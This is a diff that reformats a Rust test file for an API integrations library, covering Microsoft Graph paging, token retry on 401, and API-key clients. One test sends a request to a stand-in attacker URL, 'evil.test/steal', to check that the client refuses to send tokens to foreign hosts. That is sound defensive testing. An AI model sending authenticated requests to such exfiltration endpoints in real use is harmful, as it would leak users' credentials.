@@ -6,8 +6,8 @@ use http::Method;
 use navree_http::{AppError, Controller, Json, ModuleBuilderHttpExt, RouteDef};
 use navree_http_client::FakeResponse;
 use navree_integrations::{
-    Connection, GoogleWorkspace, IntegrationsError, MicrosoftGraph, NewApiKey,
-    NewServiceAccount, Owner, Slack,
+    Connection, GoogleWorkspace, IntegrationsError, MicrosoftGraph, NewApiKey, NewServiceAccount,
+    Owner, Slack,
 };
 use navree_kernel::{BoxFuture, Injectable, KernelError, Module, ModuleBuilder, Resolver};
 use serde_json::{Value, json};
@@ -96,10 +96,10 @@ async fn the_extractor_gives_a_graph_client_that_pages_through_results() {
     assert!(sent[1].url().as_str().contains("skiptoken=X2"));
     let token = h.fake.minted().len();
     assert_eq!(token, 1);
-    assert!(
-        sent.iter()
-            .all(|r| r.header("authorization").is_some_and(|v| v.starts_with("Bearer fake-microsoft-")))
-    );
+    assert!(sent.iter().all(|r| {
+        r.header("authorization")
+            .is_some_and(|v| v.starts_with("Bearer fake-microsoft-"))
+    }));
 
     // The directory scope set is its own connection.
     h.app
@@ -118,7 +118,8 @@ async fn a_401_gets_one_more_try_with_a_new_token() {
         Method::GET,
         "https://graph.microsoft.com/v1.0/organization",
         [
-            FakeResponse::new(401).json(&json!({ "error": { "code": "InvalidAuthenticationToken" } })),
+            FakeResponse::new(401)
+                .json(&json!({ "error": { "code": "InvalidAuthenticationToken" } })),
             FakeResponse::new(200).json(&json!({ "value": [] })),
         ],
     );
@@ -132,7 +133,10 @@ async fn a_401_gets_one_more_try_with_a_new_token() {
     assert_eq!(response.status().as_u16(), 200);
     let sent = h.fake.api().recorded();
     assert_eq!(sent.len(), 2);
-    assert_ne!(sent[0].header("authorization"), sent[1].header("authorization"));
+    assert_ne!(
+        sent[0].header("authorization"),
+        sent[1].header("authorization")
+    );
     assert_eq!(h.fake.minted().len(), 2);
 }
 
@@ -146,8 +150,15 @@ async fn tokens_never_leave_the_providers_hosts() {
         .client_for::<MicrosoftGraph>(Owner::App)
         .await
         .unwrap();
-    let error = graph.get("https://evil.test/steal").send().await.unwrap_err();
-    assert!(matches!(error, IntegrationsError::ForeignUrl { .. }), "{error:?}");
+    let error = graph
+        .get("https://evil.test/steal")
+        .send()
+        .await
+        .unwrap_err();
+    assert!(
+        matches!(error, IntegrationsError::ForeignUrl { .. }),
+        "{error:?}"
+    );
     h.fake.api().assert_nothing_sent();
     assert!(h.fake.minted().is_empty());
     assert_eq!(graph.base_url(), Some("https://graph.microsoft.com/v1.0"));
@@ -227,7 +238,10 @@ async fn api_key_clients_send_the_key_to_the_connections_own_root() {
         )
         .await
         .unwrap();
-    let edr = integrations.client(Owner::App, "edr", "default").await.unwrap();
+    let edr = integrations
+        .client(Owner::App, "edr", "default")
+        .await
+        .unwrap();
     assert_eq!(edr.base_url(), Some("https://acme.edr.example/api"));
     let response = edr
         .get("/v1/alerts")
